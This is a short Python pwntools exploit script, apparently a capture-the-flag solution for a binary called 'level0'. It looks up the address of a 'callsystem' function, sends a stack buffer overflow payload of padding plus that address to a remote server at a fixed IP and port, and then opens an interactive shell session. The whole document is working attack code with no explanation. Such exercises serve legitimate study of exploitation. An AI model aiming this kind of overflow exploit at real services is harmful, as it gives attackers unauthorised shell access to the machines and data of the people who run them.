from pwn import *

e = ELF("./level0")
#p = process("./level0")
p = remote("111.198.29.45",49745)

for symbol in e.symbols:
	print symbol, hex(e.symbols[symbol])

goal_addr = e.symbols["callsystem"]

print p.recv()

payload = "A"*(0x80+8) + p64(goal_addr)
p.sendline(payload)
p.interactive()

